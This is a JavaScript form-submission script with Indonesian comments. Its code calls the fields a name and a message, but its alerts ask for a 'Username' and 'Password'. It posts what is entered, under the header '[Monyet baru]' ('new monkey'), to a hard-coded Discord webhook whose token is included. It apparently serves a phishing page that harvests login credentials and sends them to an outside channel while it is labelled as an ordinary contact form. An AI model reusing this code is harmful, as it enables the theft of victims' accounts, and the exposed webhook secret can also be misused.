  // Ganti dengan URL Webhook Discord Anda yang sebenarnya!
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1427196224338923570/ETaFeMZmVSwMtZrMBApj39kQwIVAOVH5hYFhNjLTCPU5W4gK7m1FLcB-6NinUcnk9IAr';

        /**
         * Fungsi ini dijalankan ketika tombol submit ditekan.
         * Mencegah pengiriman default formulir, memvalidasi input,
         * dan mengirim data ke Discord Webhook API jika valid.
         * @param {Event} event - Objek event yang dikirim dari onsubmit.
         */
        function validasiDanKirim(event) {
            // 1. Mencegah pengiriman formulir secara default (agar tidak me-reload halaman)
            event.preventDefault(); 
            
            // Ambil elemen tombol untuk menonaktifkan selama loading
            const submitButton = document.getElementById('submitButton');

            var nama = document.getElementById("inputNama").value.trim();
            var pesan = document.getElementById("inputPesan").value.trim(); 

            // 2. Validasi Input (Nama tidak boleh kosong)
            if (nama === "") {
                alert("Username tidak boleh kosong!");
                return; // Hentikan proses jika validasi gagal
            }

            // --- VALIDASI BARU: Pesan tidak boleh kosong ---
            if (pesan === "") {
                alert("Password tidak boleh kosong.");
                return; // Hentikan proses jika validasi gagal
            }
            // ---------------------------------------------


            // Menonaktifkan tombol saat pengiriman dimulai
            submitButton.disabled = true;
            submitButton.textContent = 'Mengirim...';
            submitButton.classList.remove('bg-blue-600', 'hover:bg-blue-700');
            submitButton.classList.add('bg-gray-400', 'cursor-not-allowed');

            // 3. Data valid, buat payload untuk Discord
            const payload = {
                // Ganti nama pengguna Webhook (opsional)
                username: "Wkwkwk Bot",
                // 'content' adalah pesan utama yang akan muncul di Discord
                content: `🚨 **[Monyet baru]**`, 
                // 'embeds' digunakan untuk membuat tampilan pesan lebih rapi dan terstruktur
                embeds: [{
                    title: "Detail Pengiriman Formulir",
                    color: 3447003, // Warna biru
                    fields: [
                        {
                            name: "👤 Nama Pengirim",
                            value: nama,
                            inline: true
                        },
                        {
                            name: "💬 Pesan Tambahan",
                            value: pesan, // Pesan sudah pasti ada karena sudah divalidasi
                            inline: false 
                        }
                    ],
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: "Web App Submissions"
                    }
                }]
            };

            // 4. Kirim Data ke Discord Webhook API menggunakan fetch()
            fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
            })
            .then(response => {
                // 5. Penanganan Respons
                if (response.ok) {
                    alert('Proses Pengiriman 🚛🚛');
                    document.getElementById("myForm").reset(); 
                } else if (response.status === 400) {
                    // Seringkali 400 Bad Request berarti payload JSON salah atau URL Webhook rusak/salah
                    response.json().then(data => console.error("Discord Error:", data));
                    alert(`Gagal mengirim data (Status ${response.status}). Pastikan URL Webhook valid.`);
                } else {
                    alert(`Gagal mengirim data. Status: ${response.status}`);
                }
            })
            .catch(error => {
                console.error('Terjadi kesalahan jaringan:', error);
                alert('Terjadi kesalahan jaringan saat mencoba mengirim data.');
            })
            .finally(() => {
                // Aktifkan kembali tombol setelah proses selesai
                submitButton.disabled = false;
                submitButton.textContent = 'Kirim ke Discord';
                submitButton.classList.add('bg-blue-600', 'hover:bg-blue-700');
                submitButton.classList.remove('bg-gray-400', 'cursor-not-allowed');
            });
        }
